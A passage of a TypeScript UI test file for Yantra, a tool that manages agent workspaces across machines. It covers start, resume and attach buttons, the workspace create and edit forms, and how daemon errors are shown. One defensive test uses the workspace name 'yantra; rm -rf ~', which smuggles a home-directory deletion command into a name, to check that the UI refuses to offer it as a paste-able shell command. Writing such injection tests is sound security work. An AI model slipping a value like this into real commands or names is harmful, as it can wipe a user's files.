    expect(agentAct(reported({ state: 'killed', signal: 'KILL' }))).toBe(
      'resume',
    )

    for (const state of [
      'running',
      'awaiting_trust',
      'no_agent',
      'unclear',
    ] as const) {
      const row = reported(
        state === 'unclear' ? { state, because: 'why' } : { state },
      )
      expect(agentAct(row)).toBe('attach')
      expect(agentCommand(row)).toBe('yantra attach yantra')
    }

    // The two with a route behind them are no longer anything to paste.
    expect(agentCommand(reported({ state: 'no_session' }))).toBeNull()
    expect(agentCommand(reported({ state: 'finished' }))).toBeNull()
  })

  it('does not offer resume to a workspace resume refuses on sight', () => {
    const editor = { ...yantra, startup: 'nvim' }
    expect(
      agentAct(reported({ state: 'crashed', exit_status: 1 }, editor)),
    ).toBeNull()
    expect(agentAct(unreachable)).toBeNull()
  })

  // Y-130's rule, now that this cell has both kinds: `USABLE_NAME` guards the
  // string someone pastes into a shell, and never the name a button puts into
  // a URL the browser encodes — that one is the daemon's own 400 to refuse.
  it('withholds the paste from a name a shell would mangle, and not the button', () => {
    const hostile = { ...yantra, name: 'yantra; rm -rf ~' }
    expect(agentCommand(reported({ state: 'running' }, hostile))).toBeNull()

    const posted = stubPost(400, 'invalid workspace name')
    agents([reported({ state: 'no_session' }, hostile)])
    fireEvent.click(screen.getByRole('button', { name: 'Start claude' }))

    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/yantra%3B%20rm%20-rf%20~/up',
      { agent: 'claude' },
    )
  })

  // M5's own sentence, in the one section that still failed it: a phone has no
  // terminal to paste `yantra up` into.
  it('starts an agent from the page instead of handing over a command', async () => {
    const posted = stubPost(200, {
      machine: 'cachyos-g14',
      session: 'created',
      launched: true,
      term: 'xterm-256color',
    })
    agents([reported({ state: 'no_session' })])

    expect(screen.queryByText('yantra up yantra')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: 'Start claude' }))

    expect(await screen.findByText('Started on cachyos-g14.')).toBeTruthy()
    // ADR-0007 names the agent only where the workspace starts nothing of its
    // own, and the machine is never in the body — it is the workspace's (Y-117).
    expect(posted).toHaveBeenCalledWith('/api/workspaces/yantra/up', {
      agent: 'claude',
    })
  })

  it('resumes each of the four endings, and posts resume rather than up', async () => {
    const posted = stubPost(200, {
      machine: 'cachyos-g14',
      resumed: true,
      term: 'xterm-256color',
    })
    agents([
      reported({ state: 'finished' }),
      reported({ state: 'stopped' }, { ...yantra, name: 'halted' }),
      reported({ state: 'crashed', exit_status: 3 }, { ...yantra, name: 'dead' }),
      reported({ state: 'killed', signal: 'term' }, { ...yantra, name: 'shot' }),
    ])

    const buttons = screen.getAllByRole('button', { name: 'Resume' })
    expect(buttons.length).toBe(4)
    expect(screen.queryByText(/yantra resume/)).toBeNull()

    fireEvent.click(buttons[0])
    expect(await screen.findByText(/Resumed on cachyos-g14/)).toBeTruthy()
    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/yantra/resume',
      undefined,
    )
  })

  // The decision this row settled, pinned rather than left to reading: the
  // workspaces table offers all three verbs because it reads no state, and
  // this one reads a state, so it offers the one verb that state is for.
  it('offers one verb and never a stop beside an agent that has stopped', () => {
    agents([
      reported({ state: 'no_session' }),
      reported({ state: 'finished' }, { ...yantra, name: 'ended' }),
    ])

    expect(screen.getByRole('button', { name: 'Start claude' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Resume' })).toBeTruthy()
    expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull()
    // And neither verb is offered twice: no resume where nothing has run, no
    // start where a session is waiting to be continued.
    expect(screen.getAllByRole('button', { name: /^(Start|Resume)/ }).length).toBe(2)
  })

  it('leaves attach a command, there being no route to hand a terminal over', () => {
    agents([
      reported({ state: 'running' }),
      reported({ state: 'awaiting_trust' }, { ...yantra, name: 'trusting' }),
      reported({ state: 'no_agent' }, { ...yantra, name: 'shell' }),
      reported({ state: 'unclear', because: 'why' }, { ...yantra, name: 'ghost' }),
    ])

    expect(screen.getAllByText(/^yantra attach /).length).toBe(4)
    expect(
      screen.queryByRole('button', { name: /^(Start|Stop|Resume)/ }),
    ).toBeNull()
  })

  // Y-135 is what makes this button worth having here: the state it refuses
  // over is one this very table renders by name, and it is not a crash.
  it('draws a refusal about state as a refusal, not as a verb that failed', async () => {
    const said =
      'claude on cachyos-g14 is not logged in: run `claude` there and sign in'
    stubPost(409, said)
    agents([reported({ state: 'finished' })])
    fireEvent.click(screen.getByRole('button', { name: 'Resume' }))

    expect(await screen.findByText(/Nothing broke and nothing ran/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('says the trust prompt twice and hands over a command, never a dialog', async () => {
    const waiting: WorkspaceStatus = {
      workspace: 'yantra',
      machine: 'cachyos-g14',
      reached: 'yes',
      status: { state: 'awaiting_trust' },
      session: null,
    }
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [listed(yantra)] },
      '/api/sessions': { looked: 'never' },
      '/api/workspaces/yantra/status': {
        looked: 'ok',
        age_seconds: 4,
        data: waiting,
      },
    })
    render(<App />)

    // Y-188 files it under *Needs you* with one verb. The sentence beside it
    // and the paste-this command were the agents table's, and D3 §4.5 replaces
    // both with the pane itself, inline, in Y-198.
    expect(
      await screen.findByText("waiting for you at claude's trust prompt"),
    ).toBeTruthy()
    const needs = screen.getByRole('heading', { name: /Needs you/ })
    expect(within(needs.parentElement!).getByText('Answer')).toBeTruthy()
    expect(screen.queryByText('yantra attach yantra')).toBeNull()
  })

  // The two readings are taken on their own clocks, so a workspace added since
  // the last agent look is 404 while its neighbours answer.
  it('reads a 404 as a row the agent look has not seen, not as a failed class', async () => {
    const fresh = { ...yantra, name: 'fresh' }
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [listed(yantra), listed(fresh)],
      },
      '/api/sessions': { looked: 'never' },
      '/api/workspaces/yantra/status': {
        looked: 'ok',
        age_seconds: 4,
        data: reported({ state: 'running' }).status,
      },
      '/api/workspaces/fresh/status': 404,
    })
    render(<App />)

    expect(await screen.findByText('no report yet')).toBeTruthy()
    expect(screen.getByText('running')).toBeTruthy()
    expect(screen.queryByText('The look failed.')).toBeNull()
  })

  it('inherits the failure of the look that says which workspaces exist', async () => {
    stubFetch({
      '/api/machines': { looked: 'never' },
      '/api/workspaces': {
        looked: 'failed',
        age_seconds: 1,
        error: 'invalid workspace file',
      },
      '/api/sessions': { looked: 'never' },
    })
    render(<App />)

    // Once, not twice: Y-188 draws one group for the work rather than a
    // workspaces table and an agents table that repeat the same failure.
    expect(
      (await screen.findAllByText('invalid workspace file')).length,
    ).toBe(1)
  })
})

describe('creating a workspace', () => {
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
    last_seen: '2h ago',
  })
  const made: Workspace = {
    name: 'site',
    machine: 'cachyos-g14',
    repo: '/code/site',
    startup: null,
  }

  // The create answers a status and a *plain-text* body rather than a `Looked`
  // envelope, so the POST is stubbed apart from the polls. It returns what the
  // form actually sent.
  /** One level of `cachyos-g14`, as D4 §3's route answers it. */
  const listing = {
    machine: 'cachyos-g14',
    path: '/code',
    entries: [
      {
        path: '/code/site',
        name: 'site',
        repo: true,
        origin: 'git@github.com:you/site.git',
      },
      { path: '/code/scratch', name: 'scratch', repo: false, origin: null },
    ],
  }

  // The create answers a status and a *plain-text* body rather than a `Looked`
  // envelope, so the POST is stubbed apart from the polls. It returns what the
  // form actually sent. Since D4 the directory is a POST too, so the create is
  // told apart by its path rather than by its method.
  function stubCreate(status: number, body: unknown) {
    const posted = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [machine(), mac] },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [] },
      '/api/sessions': { looked: 'never' },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        // The shell's presence beacon is not this file's subject (D3 §13).
        if (path === '/api/viewing') {
          return Promise.resolve({ ok: true, status: 204 })
        }
        if (path.endsWith('/dirs')) {
          return Promise.resolve({
            ok: true,
            status: 200,
            json: () => Promise.resolve(listing),
          })
        }
        // D4: taking a directory always probes it, for the origin as much as
        // for whether it is there.
        if (path.endsWith('/probe')) {
          return Promise.resolve({
            ok: true,
            status: 200,
            json: () =>
              Promise.resolve({
                machine: 'cachyos-g14',
                path: '/code/site',
                exists: true,
                origin: null,
              }),
          })
        }
        if (init?.method === 'POST') {
          posted(JSON.parse(String(init.body)))
          return Promise.resolve({
            status,
            json: () => Promise.resolve(body),
            text: () => Promise.resolve(String(body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path]),
        })
      }),
    )
    return posted
  }

  // Y-185 gives the form its own route. It was parked on `/` between two
  // tables, and D3 §2 finding 3 is that it never moved.
  beforeEach(() => history.pushState(null, '', '/new'))

  /** D4: choose a machine, then say where in one box — what it holds is where
   *  you are. The `Repo` field is gone; there is nothing left to type into. */
  async function fill({
    machine = 'cachyos-g14',
    use = '/code/site',
    name,
  }: { machine?: string; use?: string; name?: string } = {}) {
    fireEvent.change(await screen.findByLabelText('Machine'), {
      target: { value: machine },
    })
    fireEvent.change(await screen.findByLabelText('Directory'), {
      target: { value: use },
    })
    fireEvent.click(
      await screen.findByRole('button', { name: 'Use this directory' }),
    )
    await screen.findByText(new RegExp(`Using ${use}\\.`))
    if (name !== undefined) {
      fireEvent.change(screen.getByLabelText('Name'), {
        target: { value: name },
      })
    }
    fireEvent.click(
      await screen.findByRole('button', { name: 'Create workspace' }),
    )
  }

  it('renders the workspace the 201 carried, not the list it is not in yet', async () => {
    const posted = stubCreate(201, made)
    render(<App />)
    await fill()

    const made201 = await screen.findByText('Created site on cachyos-g14.')
    // Scoped: since D4 the chosen directory is also on screen, above the form.
    expect(
      within(made201.closest('[data-slot="alert"]')!).getByText('/code/site'),
    ).toBeTruthy()

    // The read model is 30 s behind a create, so the work page still says there
    // is nothing — which is exactly what confirming by re-reading would draw.
    // Asked for on `/` since Y-185 moved the form off it, and the sentence is
    // Y-197's checklist, which is what `/` becomes when nothing is there.
    fireEvent.click(screen.getByRole('link', { name: 'fleet' }))
    expect(await screen.findByText('No workspace exists yet.')).toBeTruthy()
    // Three keys and no fourth: §B4 holds because there is nowhere to put one.
    expect(posted).toHaveBeenCalledWith({
      name: 'site',
      machine: 'cachyos-g14',
      repo: '/code/site',
    })
  })

  it('says the name is taken rather than that the create failed', async () => {
    const said =
      'a workspace named site already exists at /home/<user>/.config/yantra/workspaces/site.toml'
    stubCreate(409, said)
    render(<App />)
    await fill()

    expect(await screen.findByText('That name is already a workspace.')).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.queryByText('The daemon did not create it.')).toBeNull()
    expect(screen.queryByText(/^Created /)).toBeNull()
  })

  it("does not read a tailscale that could not answer as the caller's fault", async () => {
    const said =
      'could not establish who is calling: whois failed: failed to connect to local tailscaled'
    stubCreate(503, said)
    render(<App />)
    await fill()

    expect(
      await screen.findByText(/could not ask Tailscale who is calling/),
    ).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(
      screen.queryByText(/unusable|already a workspace|not on a node/),
    ).toBeNull()
  })

  // ADR-0009: Yantra never resolves a machine, so a sleeping Mac is a target
  // like any other and the picker must not withhold it.
  it('offers a machine that is asleep and lets it be chosen', async () => {
    const posted = stubCreate(201, { ...made, machine: mac.name })
    render(<App />)

    const asleep = await screen.findByRole('option', {
      name: 'bishwajeets-macbook-pro — offline',
    })
    expect((asleep as HTMLOptionElement).disabled).toBe(false)

    await fill({ machine: mac.name })
    expect(await screen.findByText(`Created site on ${mac.name}.`)).toBeTruthy()
    expect(posted).toHaveBeenCalledWith(
      expect.objectContaining({ machine: mac.name }),
    )
  })

  it('has nowhere to type a secret, and says startup carries a reference', async () => {
    stubCreate(201, made)
    render(<App />)
    // D4 §4.4 makes it a choice, so the field is named for what it does.
    await screen.findByText('Opens with')

    expect(screen.queryByLabelText(/secret/i)).toBeNull()
    // The sentence lives on the command, which is the only branch that takes
    // one — `claude` is the absence of a startup command, not a string.
    fireEvent.click(screen.getByRole('button', { name: 'a command…' }))
    expect(
      screen.getByText(/a secret stays a reference the shell resolves/),
    ).toBeTruthy()
  })
})

/** Y-126. The tests that matter are what a `PATCH` form gets wrong: a field
 *  nobody touched must not be sent, an emptied `startup` must be sent as `null`
 *  rather than dropped — absent leaves it alone — and the refusal that stops a
 *  live session being stranded must read as a refusal and not as a crash. */
describe('editing a workspace', () => {
  const site: Workspace = {
    name: 'site',
    machine: 'cachyos-g14',
    repo: '/code/site',
    startup: 'claude',
  }
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
  })

  // The whole body as it went on the wire, because `{}` and `{"startup":null}`
  // are the same object once JSON.parse has dropped the difference.
  function stubEdit(status: number, body: unknown, workspace = site) {
    const patched = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [machine(), mac] },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [listed(workspace)],
      },
      '/api/sessions': { looked: 'never' },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        if (init?.method === 'PATCH') {
          patched(path, String(init.body))
          return Promise.resolve({
            status,
            json: () => Promise.resolve(body),
            text: () => Promise.resolve(String(body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path] ?? { looked: 'never' }),
        })
      }),
    )
    return patched
  }

  // The three labels are the create form's three, so every field is asked for
  // by the id this form gives it rather than by its text.
  const fields = () => ({
    machine: screen.getByLabelText('Machine', { selector: '#edit-machine' }),
    repo: screen.getByLabelText('Repo', { selector: '#edit-repo' }),
    startup: screen.getByLabelText('Startup', { selector: '#edit-startup' }),
  })

  // Y-167 moved EDIT out of its own column and into the row's overflow.
  async function open() {
    fireEvent.click(await screen.findByRole('button', { name: 'More for site' }))
    fireEvent.click(await screen.findByText('Edit'))
    await screen.findByLabelText('Repo', { selector: '#edit-repo' })
  }

  const save = () =>
    fireEvent.click(screen.getByRole('button', { name: 'Save changes' }))

  it('sends the field that changed and no other, and draws the answer', async () => {
    const patched = stubEdit(200, { ...site, repo: '/code/fixed' })
    render(<App />)
    await open()

    expect(screen.getByText('Edit site')).toBeTruthy()
    fireEvent.change(fields().repo, { target: { value: '/code/fixed' } })
    save()

    expect(await screen.findByText('Edited site.')).toBeTruthy()
    // A body naming `machine` would be a move of a workspace nobody moved.
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"repo":"/code/fixed"}',
    )
    expect(screen.getByText('/code/fixed')).toBeTruthy()
    // The read model is still 30 s behind its own write, and the work page no
    // longer draws a repo to show it with: Y-188's row is the name, the agent,
    // the machine and one verb, and `/m/{name}` is where a repo is read.
  })

  it('clears a startup command rather than leaving it alone', async () => {
    const patched = stubEdit(200, { ...site, startup: null })
    render(<App />)
    await open()

    fireEvent.change(fields().startup, { target: { value: '' } })
    save()

    expect(await screen.findByText(/will open a plain shell/)).toBeTruthy()
    // `null`, not a missing key: absent is the one that leaves it alone.
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"startup":null}',
    )
  })

  it('reads a session still open as a refusal to move it, never as a crash', async () => {
    const said =
      'cannot move site off cachyos-g14: a tmux session named site is still open there — `yantra down site` ends it'
    const patched = stubEdit(409, said)
    render(<App />)
    await open()

    fireEvent.change(fields().machine, {
      target: { value: 'bishwajeets-macbook-pro' },
    })
    save()

    // The daemon's own sentence, which is where the workspace, the machine and
    // the command that ends the refusal are.
    expect(await screen.findByText(said)).toBeTruthy()
    expect(screen.getByText(/still open on the machine this would leave/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/^Edited /)).toBeNull()
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"machine":"bishwajeets-macbook-pro"}',
    )
  })

  it('sends nothing at all when nothing in the form differs', async () => {
    const patched = stubEdit(200, site)
    render(<App />)
    await open()
    save()

    expect(await screen.findByText(/Nothing here differs/)).toBeTruthy()
    // A body naming no field is the daemon's 400, and it would read as one.
    expect(patched).not.toHaveBeenCalled()
  })

  // ADR-0009: a machine name is an ssh destination, so it may be an
  // `~/.ssh/config` alias no tailnet reading lists.
  it('keeps a machine the tailnet does not list, so a repo fix is not a move', async () => {
    const alias = { ...site, machine: 'homelab-box' }
    const patched = stubEdit(200, { ...alias, repo: '/code/fixed' }, alias)
    render(<App />)
    await open()

    expect((fields().machine as HTMLSelectElement).value).toBe('homelab-box')
    fireEvent.change(fields().repo, { target: { value: '/code/fixed' } })
    save()

    expect(await screen.findByText('Edited site.')).toBeTruthy()
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"repo":"/code/fixed"}',
    )
  })
})

/** Y-113. The tests that matter are the dishonest readings: an idempotent `up`
 *  must not read as a failure, a `tailscale` that could not answer must not read
 *  as the caller's fault, and a request still awaiting ssh must not read as
 *  done. The machine is never sent — it is the workspace's own (Y-117). */
describe('acting on a workspace', () => {
  const site: Workspace = {
    name: 'personal-website',
    machine: 'bishwajeets-macbook-pro',
    repo: '/Users/<user>/Github/personal-website',
    startup: null,
  }
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
    heartbeat: beat({ age_seconds: 92 }),
  })

  type Answer = { status: number; body: unknown } | 'never'

  /** Y-167: the row's one button is the one its agent state is for, so a test
   *  about a verb has to say what state the workspace is in for it to be the
   *  verb on offer. `no_session` is *Start*; the rest are behind the overflow. */
  function stubAct(
    answer: Answer,
    workspace = site,
    state: AgentState = { state: 'no_session' },
  ) {
    const posted = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [mac] },
      '/api/workspaces': {
        looked: 'ok',
        age_seconds: 2,
        data: [listed(workspace)],
      },
      [`/api/workspaces/${workspace.name}/status`]: {
        looked: 'ok',
        age_seconds: 2,
        data: {
          workspace: workspace.name,
          machine: workspace.machine,
          reached: 'yes',
          status: state,
          session: null,
        },
      },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        // The shell's presence beacon is not this file's subject (D3 §13).
        if (path === '/api/viewing') {
          return Promise.resolve({ ok: true, status: 204 })
        }
        if (init?.method === 'POST') {
          posted(
            path,
            init.body === undefined ? undefined : JSON.parse(String(init.body)),
          )
          if (answer === 'never') return new Promise(() => {})
          return Promise.resolve({
            ok: answer.status < 400,
            status: answer.status,
            json: () => Promise.resolve(answer.body),
            text: () => Promise.resolve(String(answer.body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path] ?? { looked: 'never' }),
        })
      }),
    )
    return posted
  }

  /** The fleet named every verb twice until Y-188 — a workspaces table and an
   *  agents table computed it from the same reading — so this scoped to the
   *  first. One group draws the row now and there is nothing to disambiguate;
   *  what is left is waiting for the router to resolve its first match. */
  const card = async () => {
    await screen.findByRole('heading', { level: 1, name: 'Fleet' })
    return screen
  }

  const tap = async (name: string) =>
    fireEvent.click(await (await card()).findByRole('button', { name }))

  /** The verbs the state is not for, which is where all three still live. */
  const overflow = async () =>
    fireEvent.click(
      await (await card()).findByRole('button', { name: /^More for/ }),
    )

  it('reads a second up as attached rather than as a failure', async () => {
    stubAct({
      status: 200,
      body: {
        machine: 'bishwajeets-macbook-pro',
        session: 'attached',
        launched: false,
        term: 'xterm-256color',
      },
    })
    render(<App />)
    await tap('Start claude')

    expect(
      await screen.findByText(/already open on bishwajeets-macbook-pro/),
    ).toBeTruthy()
    // §B4 and I-30: nothing launched beside an attached session is the
    // idempotent success, so it may not be drawn as a refusal.
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it("does not read a tailscale that could not answer as the caller's fault", async () => {
    const said =
      'could not establish who is calling: whois failed: failed to connect to local tailscaled'
    stubAct({ status: 503, body: said })
    render(<App />)
    await tap('Start claude')

    expect(await screen.findByText(/Nothing could be asked/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(
      screen.queryByText(
        /knows no workspace|not one the daemon accepts|not on a node/,
      ),
    ).toBeNull()
  })

  // Y-135 and I-49: a human has not answered a dialog on their own machine,
  // which ADR-0011 leaves to them. Nothing failed, so nothing may say it did.
  it('draws an agent holding at the trust prompt as a refusal, not a crash', async () => {
    const said =
      "`personal-website` is holding at claude's trust prompt, so it has no conversation to continue"
    stubAct({ status: 409, body: said }, site, { state: 'stopped' })
    render(<App />)
    await tap('Resume')

    expect(await screen.findByText(/Nothing broke and nothing ran/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('keeps a missing workspace apart from a verb that ran and failed', async () => {
    stubAct({
      status: 404,
      body: 'no workspace named personal-website at /home/<user>/.config/yantra/workspaces/personal-website.toml',
    })
    render(<App />)
    await tap('Start claude')

    expect(
      await screen.findByText('The daemon knows no workspace by that name.'),
    ).toBeTruthy()
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('does not read a request still awaiting ssh as done, and sends one', async () => {
    const posted = stubAct('never')
    render(<App />)
    await tap('Start claude')

    const flight = await screen.findByRole('button', { name: 'starting…' })
    expect(flight.hasAttribute('disabled')).toBe(true)
    expect(screen.getByText(/waiting on bishwajeets-macbook-pro/)).toBeTruthy()
    // Nothing has been answered, so nothing may be reported.
    expect(screen.queryByRole('alert')).toBeNull()

    fireEvent.click(flight)
    await overflow()
    fireEvent.click(await screen.findByText('Stop'))
    expect(posted).toHaveBeenCalledTimes(1)
  })

  // ADR-0009 and R-23: the daemon decides whether a sleeping Mac can be
  // reached, and the page neither refuses for it nor hides what it knows.
  it('says the machine is asleep and still lets the button be tapped', async () => {
    const posted = stubAct({
      status: 200,
      body: {
        machine: 'bishwajeets-macbook-pro',
        session: 'created',
        launched: true,
        term: 'xterm-256color',
      },
    })
    render(<App />)

    // Beside the workspace it will act on. The machines table moved in Y-189.
    expect((await screen.findAllByText('asleep or off')).length).toBe(1)
    const start = await (await card()).findByRole('button', {
      name: 'Start claude',
    })
    expect(start.hasAttribute('disabled')).toBe(false)

    fireEvent.click(start)
    expect(
      await screen.findByText('Started on bishwajeets-macbook-pro.'),
    ).toBeTruthy()
    // The machine is not in the body: the target is the workspace's own.
    expect(posted).toHaveBeenCalledWith('/api/workspaces/personal-website/up', {
      agent: 'claude',
    })
  })

  // Two renders in one `it` left both mounted, so every query saw the fleet
  // twice. One idea per test is also what §A6 asks of the prose.
  it('reads nothing to stop as a success', async () => {
    stubAct({
      status: 200,
      body: { machine: 'bishwajeets-macbook-pro', stopped: false, ending: null },
    })
    render(<App />)
    await overflow()
    fireEvent.click(await screen.findByText('Stop'))

    expect(await screen.findByText(/nothing to stop/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
  })

  it('reads an agent already working as a success', async () => {
    stubAct(
      {
        status: 200,
        body: {
          machine: 'bishwajeets-macbook-pro',
          resumed: false,
          term: 'xterm-256color',
        },
      },
      site,
      { state: 'stopped' },
    )
    render(<App />)
    await tap('Resume')

    expect(await screen.findByText(/left exactly as it is/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
  })

  it('offers no resume, and no agent, to a workspace that starts its own thing', async () => {
    const editor = { ...site, startup: 'npm run dev' }
    const posted = stubAct(
      {
        status: 200,
        body: {
          machine: 'bishwajeets-macbook-pro',
          session: 'created',
          // `launched` reports an agent, and a workspace's own startup is not
          // one — measured live against a session that really was running it.
          launched: false,
          term: 'xterm-256color',
        },
      },
      editor,
    )
    render(<App />)
    await tap('Start')
    await overflow()

    // ADR-0015 refuses it on sight, and ADR-0007 refuses the agent beside it —
    // so it is missing from the overflow too, which is where the rest live.
    expect(await screen.findByText('Stop')).toBeTruthy()
    expect(screen.queryByText('Resume')).toBeNull()
    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/personal-website/up',
      {},
    )
    expect(await screen.findByText(/running the workspace's own startup/)).toBeTruthy()
    expect(screen.queryByText(/holding a plain shell/)).toBeNull()
  })
})
